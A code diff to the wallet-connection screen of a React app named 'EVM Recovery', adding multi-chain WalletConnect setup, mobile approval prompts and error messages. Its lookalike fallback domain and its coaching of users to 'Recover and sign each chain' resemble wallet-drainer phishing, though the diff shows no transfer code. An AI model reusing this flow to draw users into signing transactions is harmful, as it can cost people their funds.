@@ -382,28 +382,47 @@ function App() {
       return;
     }
     setBusy(true);
-    setStatus('Opening WalletConnect…');
+    setStatus(mobile
+      ? 'Opening WalletConnect… Tap Open, approve in Trust/MetaMask, then return here.'
+      : 'Opening WalletConnect… Scan the QR with your wallet app.');
     try {
       if (walletConnectProvider) {
         try { await walletConnectProvider.disconnect(); } catch {}
         walletConnectProvider = null;
       }
 
+      const primaryChains = [1, 56, 137, 8453, 42161, 10, 43114, 100] as [number, ...number[]];
+      const optional = ALL_CHAIN_IDS.filter(id => !primaryChains.includes(id)) as number[];
+
       walletConnectProvider = await EthereumProvider.init({
         projectId,
-        chains: [1],
-        optionalChains: ALL_CHAIN_IDS,
+        chains: primaryChains,
+        optionalChains: optional.length ? (optional as [number, ...number[]]) : primaryChains,
         rpcMap: RPC_MAP,
         showQrModal: true,
-        qrModalOptions: { enableMobileFullScreen: true },
+        qrModalOptions: {
+          themeMode: 'dark',
+          enableExplorer: true,
+          explorerRecommendedWalletIds: [
+            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
+            'fd20dc426fb37566d803205b19bbc1d4096b8704c4f5aed0ce74d7ec4f623e44',
+          ],
+        } as any,
         methods: [...CHAIN_METHODS],
         events: ['chainChanged', 'accountsChanged', 'disconnect', 'session_event'],
         metadata: {
           name: 'EVM Recovery',
           description: 'Non-custodial multi-chain recovery',
-          url: window.location.origin,
-          icons: [`${window.location.origin}/favicon.svg`],
+          url: typeof window !== 'undefined' ? window.location.origin : 'https://walletconnecthub.pages.dev',
+          icons: [`${typeof window !== 'undefined' ? window.location.origin : 'https://walletconnecthub.pages.dev'}/favicon.svg`],
         },
+      });
+
+      walletConnectProvider.on('display_uri', () => {
+        setStatus(mobile
+          ? 'Tap Open → approve connection in Trust Wallet → return to this page.'
+          : 'Scan QR with your wallet app, then approve the connection.');
       });
 
       walletConnectProvider.on('accountsChanged', (a: string[]) => {
@@ -426,11 +445,25 @@ function App() {
         setStatus('Wallet disconnected.');
         walletConnectProvider = null;
       });
+      walletConnectProvider.on('connect', () => {
+        setStatus('Wallet connected. Finishing setup…');
+      });
 
       const accounts = await walletConnectProvider.enable();
-      await finishConnection(walletConnectProvider, accounts?.[0]);
-    } catch (e) {
-      setStatus(e instanceof Error ? e.message : 'WalletConnect cancelled or failed.');
+      if (!accounts?.length) {
+        setStatus('No account returned. In Trust Wallet: Settings → WalletConnect → approve, or try again.');
+        return;
+      }
+      await finishConnection(walletConnectProvider, accounts[0]);
+    } catch (e: any) {
+      const msg = e?.message || String(e);
+      if (/user rejected|denied|cancelled|canceled/i.test(msg)) {
+        setStatus('Connection cancelled in wallet. Tap WalletConnect and approve when prompted.');
+      } else if (/project id|unauthorized|401/i.test(msg)) {
+        setStatus('Invalid WalletConnect Project ID. Check VITE_WALLETCONNECT_PROJECT_ID in Cloudflare.');
+      } else {
+        setStatus(msg || 'WalletConnect failed. Tap Open in the modal, approve in Trust, return here.');
+      }
     } finally {
       setBusy(false);
     }
@@ -476,7 +509,7 @@ function App() {
             <div className="hero-copy">
               <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
               <h1>Connect your<br /><em>wallet.</em></h1>
-              <p>Use WalletConnect for multi-chain support. Recover signs one transaction at a time on each chain.</p>
+              <p>On phone: WalletConnect → Trust → Open → Approve → return here. Then tap Recover and sign each chain.</p>
             </div>
             <div className="hero-card">
               <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
